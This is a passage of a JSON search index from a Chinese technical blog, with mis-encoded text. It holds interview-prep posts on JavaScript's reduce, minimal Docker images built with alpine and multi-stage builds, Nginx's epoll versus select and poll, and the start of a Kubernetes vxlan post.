class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003einitialvalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /* ä»»æ„ä¸€ä¸ªåˆå§‹åŒ–çš„å€¼ */ \u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emyArray.reduce\u003cspan class=\"o\"\u003e(\u003c/span\u003ecallbackfn\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emyArray.reduce\u003cspan class=\"o\"\u003e(\u003c/span\u003ecallbackfn, initialValue\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003ereduce\u003c/code\u003e çš„å‚æ•°å¦‚ä¸‹:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003ecallbackfn\u003c/code\u003e\u003c/strong\u003e: å¿…é¡»æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¼šåœ¨æ•´ä¸ªæ•°ç»„ä¸­åå¤è°ƒç”¨ï¼Œreduce è°ƒç”¨ callbackfn çš„æ—¶å€™æœ‰4ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å®šä¹‰å®ƒä»¬æ˜¯ \u003ccode\u003epreviousValue\u003c/code\u003e, \u003ccode\u003ecurrentElement\u003c/code\u003e, \u003ccode\u003eindex\u003c/code\u003e å’Œ \u003ccode\u003earray\u003c/code\u003e ï¼Œçœ‹èµ·æ¥åƒä¸‹é¢ä¸€æ ·:\u003c/p\u003e","title":"Javascriptsä¹‹æ•°ç»„çš„reduce"},{"content":"é¢è¯•çš„æ—¶å€™è¢«é—®åˆ°ï¼šå¦‚ä½•æ‰èƒ½è®© docker æ‰“å‡ºçš„é•œåƒåŒ…å°½é‡å°ï¼Ÿ\nå…¶å®åœ¨ç”Ÿäº§å·²ç»å°½é‡ä½¿ç”¨æœ€å°åŒ–çš„é•œåƒåŒ…äº†ï¼Œåªæ˜¯çªç„¶è¢«é—®åˆ°è¿˜æ˜¯æœ‰ç‚¹æ‡µåœˆï¼›å› ä¸ºå°è±¡ä¸­è‡ªå·±åŸºæœ¬æ˜¯ä½¿ç”¨ alphine åšåº•åŒ…ï¼ŒDockerfile é€šå¸¸å°±æ˜¯ copy ä¸€ä¸ªå¯æ‰§è¡Œçš„ç¨‹åºè¿›å»å°±å®Œäº‹äº†ï¼Œå¦‚æœä¸è¡Œï¼Œå†å¼€ shell è¿›å»æ…¢æ…¢æ·»åŠ ç¼ºå°‘çš„åº“æ–‡ä»¶ã€‚\nè¿™é‡Œå°±æ€»ç»“ä¸€ä¸‹ï¼Œä¸¤ç‚¹ï¼š\nä¸€ã€ä½¿ç”¨å°½é‡å°çš„åº•åŒ… ä»¥ alphine ä¸ºä¸»ï¼Œä½¿ç”¨ alphine åº•åŒ…çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹ï¼š\n1ã€æ›¿æ¢ apk çš„æº\n2ã€æ›´æ–°ã€æ›´æ–°è¯ä¹¦\n3ã€æ³¨æ„ Timezone çš„è®¾ç½®\n4ã€æ³¨æ„ glibc åº“çš„å…¼å®¹é—®é¢˜\näºŒã€ä½¿ç”¨åˆ†é˜¶æ®µbuild é€šå¸¸ç±»ä¼¼cã€goã€rustä¹‹ç±»çš„æºä»£ç ï¼Œéƒ½éœ€è¦ç»è¿‡ç¼–è¯‘ï¼Œæœ€åäº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆå®Œæ•´çš„ç¼–è¯‘ç¯å¢ƒå…¶å®å¯¹æœ€åçš„é•œåƒæ¥è¯´éƒ½æ˜¯ä¸éœ€è¦çš„ã€‚\næ‰€ä»¥åˆ©ç”¨åˆ†é˜¶æ®µbuildï¼Œç”©è„±ç¼–è¯‘ç¯å¢ƒä»¥åŠä¸­é—´äº§ç‰©ï¼Œå°±å¯ä»¥ç¼©å°æœ€å build å‡ºé•œåƒçš„å¤§å°ï¼Œä½¿ç”¨ä¹Ÿå¾ˆç®€å•ã€‚\nDockerfile æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\nFROM golang:alpine AS build-env WORKDIR /app ADD . /app RUN cd /app \u0026amp;\u0026amp; go build -o goapp FROM alpine RUN apk update \u0026amp;\u0026amp; \\ apk add ca-certificates \u0026amp;\u0026amp; \\ update-ca-certificates \u0026amp;\u0026amp; \\ rm -rf /var/cache/apk/* WORKDIR /app COPY --from=build-env /app/goapp /app EXPOSE 8080 ENTRYPOINT ./goapp ","permalink":"https://rendoumi.com/posts/20220401-docker_mini_image/","summary":"\u003cp\u003eé¢è¯•çš„æ—¶å€™è¢«é—®åˆ°ï¼šå¦‚ä½•æ‰èƒ½è®© docker æ‰“å‡ºçš„é•œåƒåŒ…å°½é‡å°ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eå…¶å®åœ¨ç”Ÿäº§å·²ç»å°½é‡ä½¿ç”¨æœ€å°åŒ–çš„é•œåƒåŒ…äº†ï¼Œåªæ˜¯çªç„¶è¢«é—®åˆ°è¿˜æ˜¯æœ‰ç‚¹æ‡µåœˆï¼›å› ä¸ºå°è±¡ä¸­è‡ªå·±åŸºæœ¬æ˜¯ä½¿ç”¨ alphine åšåº•åŒ…ï¼ŒDockerfile é€šå¸¸å°±æ˜¯ copy ä¸€ä¸ªå¯æ‰§è¡Œçš„ç¨‹åºè¿›å»å°±å®Œäº‹äº†ï¼Œå¦‚æœä¸è¡Œï¼Œå†å¼€ shell è¿›å»æ…¢æ…¢æ·»åŠ ç¼ºå°‘çš„åº“æ–‡ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œå°±æ€»ç»“ä¸€ä¸‹ï¼Œä¸¤ç‚¹ï¼š\u003c/p\u003e\n\u003ch3 id=\"ä¸€ä½¿ç”¨å°½é‡å°çš„åº•åŒ…\"\u003eä¸€ã€ä½¿ç”¨å°½é‡å°çš„åº•åŒ…\u003c/h3\u003e\n\u003cp\u003eä»¥ alphine ä¸ºä¸»ï¼Œä½¿ç”¨ alphine åº•åŒ…çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003e1ã€æ›¿æ¢ apk çš„æº\u003c/p\u003e\n\u003cp\u003e2ã€æ›´æ–°ã€æ›´æ–°è¯ä¹¦\u003c/p\u003e\n\u003cp\u003e3ã€æ³¨æ„ Timezone çš„è®¾ç½®\u003c/p\u003e\n\u003cp\u003e4ã€æ³¨æ„ glibc åº“çš„å…¼å®¹é—®é¢˜\u003c/p\u003e\n\u003ch3 id=\"äºŒä½¿ç”¨åˆ†é˜¶æ®µbuild\"\u003eäºŒã€ä½¿ç”¨åˆ†é˜¶æ®µbuild\u003c/h3\u003e\n\u003cp\u003eé€šå¸¸ç±»ä¼¼cã€goã€rustä¹‹ç±»çš„æºä»£ç ï¼Œéƒ½éœ€è¦ç»è¿‡ç¼–è¯‘ï¼Œæœ€åäº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆå®Œæ•´çš„ç¼–è¯‘ç¯å¢ƒå…¶å®å¯¹æœ€åçš„é•œåƒæ¥è¯´éƒ½æ˜¯ä¸éœ€è¦çš„ã€‚\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥åˆ©ç”¨åˆ†é˜¶æ®µbuildï¼Œç”©è„±ç¼–è¯‘ç¯å¢ƒä»¥åŠä¸­é—´äº§ç‰©ï¼Œå°±å¯ä»¥ç¼©å°æœ€å build å‡ºé•œåƒçš„å¤§å°ï¼Œä½¿ç”¨ä¹Ÿå¾ˆç®€å•ã€‚\u003c/p\u003e\n\u003cp\u003eDockerfile æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFROM golang:alpine AS build-env\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eWORKDIR /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eADD . /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRUN \u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /app \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e go build -o goapp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFROM alpine\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRUN apk update \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   apk add ca-certificates \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   update-ca-certificates \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e   rm -rf /var/cache/apk/*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eWORKDIR /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCOPY --from\u003cspan class=\"o\"\u003e=\u003c/span\u003ebuild-env /app/goapp /app\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEXPOSE \u003cspan class=\"m\"\u003e8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eENTRYPOINT ./goapp\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"é¢è¯•ä¹‹Dockerå¦‚ä½•æ‰“å‡ºæœ€å°çš„é•œåƒ"},{"content":"é¢è¯•æ—¶è¢«é—®åˆ°ï¼šæ˜¯å¦äº†è§£ Nginxï¼Œå®ƒä½¿ç”¨çš„ epoll æ¨¡å¼å’Œå…¶ä»–çš„ç›¸æ¯”æœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ\nç›´æ¥è¢«é—®ä½ï¼Œå®é™…ç”Ÿäº§ä¸­é…è¿‡ä¸å°‘çš„ Nginxï¼Œå„ç§ rewriteã€regexã€æ­£åå‘ä»£ç†ã€phpã€fast-cgiã€é™æµã€è¯ä¹¦ã€jwtã€corsï¼›epoll åªå¤§æ¦‚æœ‰å°è±¡æ˜¯ä¸‹é¢è¿™è¡Œï¼š\nevents { use epoll; worker_connections 1024; } å®åœ¨æ˜¯æ±—é¢œå•Šï¼Œæ‰€ä»¥å¾—ä»”ç»†ç ”ç©¶ä¸€ä¸‹è¿™ä¸ª epollã€‚\né¦–å…ˆæ‰”æ¦‚å¿µ IOå¤šè·¯å¤ç”¨ï¼š å¤šè·¯æ˜¯æŒ‡ç½‘ç»œè¿æ¥ï¼Œå¤ç”¨æŒ‡çš„æ˜¯åŒä¸€ä¸ªçº¿ç¨‹ã€‚\nIOå¤šè·¯å¤ç”¨æ˜¯ä¸€ç§åŒæ­¥IOæ¨¡å‹ï¼Œå®ç°ä¸€ä¸ªçº¿ç¨‹å¯ä»¥ç›‘è§†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼›\nä¸€æ—¦æŸä¸ªæè¿°ç¬¦å°±ç»ªï¼ˆä¸€èˆ¬æ˜¯è¯»å°±ç»ªæˆ–è€…å†™å°±ç»ªï¼‰ï¼Œå°±èƒ½å¤Ÿé€šçŸ¥åº”ç”¨ç¨‹åºè¿›è¡Œç›¸åº”çš„è¯»å†™æ“ä½œï¼›\næ²¡æœ‰æ–‡ä»¶æè¿°ç¬¦å°±ç»ªæ—¶ä¼šé˜»å¡åº”ç”¨ç¨‹åºï¼Œäº¤å‡ºcpuã€‚\né‚£ä¹ˆIOå¤šè·¯å¤ç”¨çš„å®ç°æ–¹æ³•æœ‰ä¸‰ç§ï¼š selectã€pollã€epoll selectã€pollã€epollæœ¬è´¨ä¸Šéƒ½æ˜¯åŒæ­¥I/Oï¼Œç”¨æˆ·è¿›ç¨‹ï¼ˆè¿™é‡Œå°±æ˜¯Nginxï¼‰è´Ÿè´£è¯»å†™ï¼ˆä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼‰ï¼Œè¯»å†™è¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·è¿›ç¨‹æ˜¯é˜»å¡çš„ã€‚\nselectï¼š\næŸ¥è¯¢ fd_set ä¸­ï¼Œæ˜¯å¦æœ‰å°±ç»ªçš„ fdï¼Œå¯ä»¥è®¾å®šä¸€ä¸ªè¶…æ—¶æ—¶é—´ï¼Œå½“æœ‰ fd (File descripter) å°±ç»ªæˆ–è¶…æ—¶è¿”å›ï¼›\nfd_set æ˜¯ä¸€ä¸ªä½é›†åˆï¼Œå¤§å°æ˜¯åœ¨ç¼–è¯‘å†…æ ¸æ—¶çš„å¸¸é‡ï¼Œé»˜è®¤å¤§å°ä¸º 1024\nç‰¹ç‚¹ï¼š\nè¿æ¥æ•°é™åˆ¶ï¼Œfd_set å¯è¡¨ç¤ºçš„ fd æ•°é‡å¤ªå°äº†ï¼›\nçº¿æ€§æ‰«æï¼šåˆ¤æ–­ fd æ˜¯å¦å°±ç»ªï¼Œéœ€è¦éå†ä¸€è¾¹ fd_setï¼›\næ•°æ®å¤åˆ¶ï¼šä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå¤åˆ¶è¿æ¥å°±ç»ªçŠ¶æ€ä¿¡æ¯\npollï¼š\nè§£å†³äº†è¿æ¥æ•°é™åˆ¶ï¼š\npoll ä¸­å°† select ä¸­çš„ fd_set æ›¿æ¢æˆäº†ä¸€ä¸ª pollfd æ•°ç»„\nè§£å†³ fd æ•°é‡è¿‡å°çš„é—®é¢˜\næ•°æ®å¤åˆ¶ï¼šä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå¤åˆ¶è¿æ¥å°±ç»ªçŠ¶æ€ä¿¡æ¯\nepollï¼ševent äº‹ä»¶é©±åŠ¨\näº‹ä»¶æœºåˆ¶ï¼šé¿å…çº¿æ€§æ‰«æ\nä¸ºæ¯ä¸ª fdï¼Œæ³¨å†Œä¸€ä¸ªç›‘å¬äº‹ä»¶\nfd å˜æ›´ä¸ºå°±ç»ªæ—¶ï¼Œå°† fd æ·»åŠ åˆ°å°±ç»ªé“¾è¡¨\nfd æ•°é‡ï¼šæ— é™åˆ¶ï¼ˆOS çº§åˆ«çš„é™åˆ¶ï¼Œå•ä¸ªè¿›ç¨‹èƒ½æ‰“å¼€å¤šå°‘ä¸ª fdï¼‰\nåŒºåˆ«åœ¨äº:\nepollè¾ƒçµæ´»ï¼Œå¦‚æœæœ‰ä¸€ç™¾ä¸‡ä¸ªé“¾æ¥çŠ¶æ€åŒæ—¶ä¿æŒï¼Œä½†æ˜¯åœ¨æŸä¸ªæ—¶åˆ»ï¼Œåªæœ‰å‡ ç™¾ä¸ªé“¾æ¥æ˜¯æ´»è·ƒçš„ã€‚epollçš„å¤„ç†æ˜¯é€šè¿‡epoll_create()åˆ›å»ºå¯¹è±¡ï¼Œepoll_ctl()æ”¶é›†æ‰€æœ‰çš„å¥—æ¥å­—æ·»åŠ åˆ°epollå¯¹è±¡ï¼Œepoll_wait()æ”¶é›†æ‰€æœ‰å‘ç”Ÿäº‹ä»¶ä¹Ÿå°±æ˜¯æ‰€è°“çš„æ´»è·ƒçš„é“¾æ¥ï¼Œå¹¶æ”¶é›†åˆ°ä¸€ä¸ªListé“¾è¡¨ä¸­ï¼Œè¿™æ ·åªéœ€è¦éå†è¿™äº›Listé“¾è¡¨é‡Œçš„æ•°æ®ï¼Œè€Œä¸ç”¨éå†ä¸€ç™¾ä¸‡ä¸ªé“¾æ¥ã€‚ è€Œåè€…select pollåˆ™æ˜¯æ¯æ¬¡æ”¶é›†äº‹ä»¶æ—¶ï¼Œå°†è¿™ä¸€ç™¾ä¸‡ä¸ªé“¾æ¥éƒ½ä¼ ç»™æ“ä½œç³»ç»Ÿï¼Œå†ç”±æ“ä½œç³»ç»Ÿå†…æ ¸ä¸Šåˆ¤æ–­æŸäº›é“¾æ¥äº§ç”Ÿäº†äº‹ä»¶ï¼Œé€ æˆäº†å·¨å¤§çš„èµ„æºæµªè´¹ï¼ˆå¤§æ‰¹é‡çš„ä¸åŒæ€å†…å­˜å¤åˆ¶ï¼‰ã€‚\nä¸ºä»€ä¹ˆepollæ•ˆç‡æ¯”è¾ƒé«˜ï¼š\nepoll åœ¨epoll_create æ—¶ï¼Œå°±å·²ç»å»ºç«‹å¥½äº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å¯¹åº” epoll å¯¹è±¡ï¼ŒåŒæ—¶ï¼Œåœ¨å†…æ ¸ cache é‡Œå»ºç«‹äº†ä¸€ä¸ªçº¢é»‘æ ‘ï¼Œç”¨äºå­˜å‚¨åç»­epoll_ctlä¼ æ¥çš„socketè¿æ¥ã€‚å†åŒæ—¶ï¼Œåˆå»ºç«‹äº†ä¸€ä¸ªlisté“¾è¡¨ï¼Œç”¨äºå­˜å‚¨å‡†å¤‡å°±ç»ªçš„äº‹ä»¶ã€‚ ç­‰åˆ° epoll_wait() è°ƒç”¨çš„æ—¶å€™ï¼Œåªéœ€è¦è§‚å¯Ÿlisté“¾è¡¨é‡Œæœ‰æ²¡æœ‰æ•°æ®å°±å¯ä»¥ï¼Œæœ‰æ•°æ®å°±è¿”å›ï¼Œæ²¡æ•°æ®å°±sleepã€‚ç­‰åˆ°timeoutåï¼Œå³ä½¿æ²¡æ•°æ®ï¼Œä¹Ÿè¿”å›äº†ã€‚æ‰€ä»¥ epoll_wait ä¼šéå¸¸é«˜æ•ˆ\nä¸‰è€…çš„æ¯”è¾ƒï¼š\nselect poll epoll æ•°æ®ç»“æ„ bitmap æ•°ç»„ çº¢é»‘æ ‘ æœ€å¤§è¿æ¥æ•° 1024 æ— ä¸Šé™ æ— ä¸Šé™ fdæ‹·è´ æ¯æ¬¡è°ƒç”¨selectæ‹·è´ æ¯æ¬¡è°ƒç”¨pollæ‹·è´ fdé¦–æ¬¡è°ƒç”¨epoll_ctlæ‹·è´ï¼Œæ¯æ¬¡è°ƒç”¨epoll_waitä¸æ‹·è´ å·¥ä½œæ•ˆç‡ è½®è¯¢ï¼šO(n) è½®è¯¢ï¼šO(n) å›è°ƒï¼šO(1) Nginx çš„å¹¶å‘å¤„ç†èƒ½åŠ› å…³äº Nginx çš„å¹¶å‘å¤„ç†èƒ½åŠ›ï¼š\nå¹¶å‘è¿æ¥æ•°ï¼Œä¸€èˆ¬ä¼˜åŒ–åï¼Œå³°å€¼èƒ½ä¿æŒåœ¨ 1~3w å·¦å³ã€‚ï¼ˆå†…å­˜å’Œ CPU æ ¸å¿ƒæ•°ä¸åŒï¼Œä¼šæœ‰è¿›ä¸€æ­¥ä¼˜åŒ–ç©ºé—´ï¼‰ Nginx çš„æœ€å¤§è¿æ¥æ•°ï¼šWorker è¿›ç¨‹æ•°é‡ x å•ä¸ª Worker è¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•° ","permalink":"https://rendoumi.com/posts/20220401-nginx_epoll/","summary":"\u003cp\u003eé¢è¯•æ—¶è¢«é—®åˆ°ï¼šæ˜¯å¦äº†è§£ Nginxï¼Œå®ƒä½¿ç”¨çš„ epoll æ¨¡å¼å’Œå…¶ä»–çš„ç›¸æ¯”æœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eç›´æ¥è¢«é—®ä½ï¼Œå®é™…ç”Ÿäº§ä¸­é…è¿‡ä¸å°‘çš„ Nginxï¼Œå„ç§ rewriteã€regexã€æ­£åå‘ä»£ç†ã€phpã€fast-cgiã€é™æµã€è¯ä¹¦ã€jwtã€corsï¼›epoll åªå¤§æ¦‚æœ‰å°è±¡æ˜¯ä¸‹é¢è¿™è¡Œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eevents \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    use epoll\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    worker_connections  1024\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®åœ¨æ˜¯æ±—é¢œå•Šï¼Œæ‰€ä»¥å¾—ä»”ç»†ç ”ç©¶ä¸€ä¸‹è¿™ä¸ª epollã€‚\u003c/p\u003e\n\u003ch4 id=\"é¦–å…ˆæ‰”æ¦‚å¿µ\"\u003eé¦–å…ˆæ‰”æ¦‚å¿µ\u003c/h4\u003e\n\u003ch4 id=\"ioå¤šè·¯å¤ç”¨\"\u003eIOå¤šè·¯å¤ç”¨ï¼š\u003c/h4\u003e\n\u003cp\u003eå¤šè·¯æ˜¯æŒ‡ç½‘ç»œè¿æ¥ï¼Œå¤ç”¨æŒ‡çš„æ˜¯åŒä¸€ä¸ªçº¿ç¨‹ã€‚\u003c/p\u003e\n\u003cp\u003eIOå¤šè·¯å¤ç”¨æ˜¯ä¸€ç§åŒæ­¥IOæ¨¡å‹ï¼Œå®ç°ä¸€ä¸ªçº¿ç¨‹å¯ä»¥ç›‘è§†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼›\u003c/p\u003e\n\u003cp\u003eä¸€æ—¦æŸä¸ªæè¿°ç¬¦å°±ç»ªï¼ˆä¸€èˆ¬æ˜¯è¯»å°±ç»ªæˆ–è€…å†™å°±ç»ªï¼‰ï¼Œå°±èƒ½å¤Ÿé€šçŸ¥åº”ç”¨ç¨‹åºè¿›è¡Œç›¸åº”çš„è¯»å†™æ“ä½œï¼›\u003c/p\u003e\n\u003cp\u003eæ²¡æœ‰æ–‡ä»¶æè¿°ç¬¦å°±ç»ªæ—¶ä¼šé˜»å¡åº”ç”¨ç¨‹åºï¼Œäº¤å‡ºcpuã€‚\u003c/p\u003e\n\u003ch4 id=\"é‚£ä¹ˆioå¤šè·¯å¤ç”¨çš„å®ç°æ–¹æ³•æœ‰ä¸‰ç§-selectpollepoll\"\u003eé‚£ä¹ˆIOå¤šè·¯å¤ç”¨çš„å®ç°æ–¹æ³•æœ‰ä¸‰ç§ï¼š selectã€pollã€epoll\u003c/h4\u003e\n\u003cp\u003eselectã€pollã€epollæœ¬è´¨ä¸Šéƒ½æ˜¯åŒæ­¥I/Oï¼Œç”¨æˆ·è¿›ç¨‹ï¼ˆè¿™é‡Œå°±æ˜¯Nginxï¼‰è´Ÿè´£è¯»å†™ï¼ˆä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼‰ï¼Œè¯»å†™è¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·è¿›ç¨‹æ˜¯é˜»å¡çš„ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eselectï¼š\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eæŸ¥è¯¢ fd_set ä¸­ï¼Œæ˜¯å¦æœ‰å°±ç»ªçš„ fdï¼Œå¯ä»¥è®¾å®šä¸€ä¸ªè¶…æ—¶æ—¶é—´ï¼Œå½“æœ‰ fd (File descripter) å°±ç»ªæˆ–è¶…æ—¶è¿”å›ï¼›\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003efd_set æ˜¯ä¸€ä¸ªä½é›†åˆï¼Œå¤§å°æ˜¯åœ¨ç¼–è¯‘å†…æ ¸æ—¶çš„å¸¸é‡ï¼Œé»˜è®¤å¤§å°ä¸º 1024\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eç‰¹ç‚¹ï¼š\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eè¿æ¥æ•°é™åˆ¶ï¼Œfd_set å¯è¡¨ç¤ºçš„ fd æ•°é‡å¤ªå°äº†ï¼›\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eçº¿æ€§æ‰«æï¼šåˆ¤æ–­ fd æ˜¯å¦å°±ç»ªï¼Œéœ€è¦éå†ä¸€è¾¹ fd_setï¼›\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ•°æ®å¤åˆ¶ï¼šä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå¤åˆ¶è¿æ¥å°±ç»ªçŠ¶æ€ä¿¡æ¯\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003epollï¼š\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eè§£å†³äº†è¿æ¥æ•°é™åˆ¶ï¼š\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003epoll ä¸­å°† select ä¸­çš„ fd_set æ›¿æ¢æˆäº†ä¸€ä¸ª pollfd æ•°ç»„\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eè§£å†³ fd æ•°é‡è¿‡å°çš„é—®é¢˜\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ•°æ®å¤åˆ¶ï¼šä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå¤åˆ¶è¿æ¥å°±ç»ªçŠ¶æ€ä¿¡æ¯\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eepollï¼ševent äº‹ä»¶é©±åŠ¨\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eäº‹ä»¶æœºåˆ¶ï¼šé¿å…çº¿æ€§æ‰«æ\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eä¸ºæ¯ä¸ª fdï¼Œæ³¨å†Œä¸€ä¸ªç›‘å¬äº‹ä»¶\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003efd å˜æ›´ä¸ºå°±ç»ªæ—¶ï¼Œå°† fd æ·»åŠ åˆ°å°±ç»ªé“¾è¡¨\u003c/p\u003e","title":"é¢è¯•ä¹‹Nginxçš„epollçš„ä¼˜åŠ¿"},{"content":"ç°åœ¨å„å¤§å…¬æœ‰äº‘çš„ k8s ç½‘ç»œæ’ä»¶åŸºæœ¬ç”¨çš„éƒ½æ˜¯ vxlanï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦å¯¹è¿™ä¸ªè¿›è¡Œä¸€ä¸‹è¯¦ç»†äº†è§£ï¼Œä»¥ä¾¿ç”¨äºå…¬å¸çš„æ­£å¼ç”Ÿäº§ç¯å¢ƒã€‚\nä¸€ã€åŸç† é¦–å…ˆï¼Œkubernetesçš„ç½‘ç»œæ¨¡å‹ï¼š\nåŒ…å«ä¸‰è¦ç´ ï¼š\næ‰€æœ‰çš„å®¹å™¨(container)ä¹‹é—´èƒ½å¤Ÿåœ¨ä¸ä½¿ç”¨ NAT çš„æƒ…å†µä¸‹äº’ç›¸é€šè®¯\næ‰€æœ‰çš„èŠ‚ç‚¹(Node)èƒ½å¤Ÿåœ¨ä¸ä½¿ç”¨ NAT 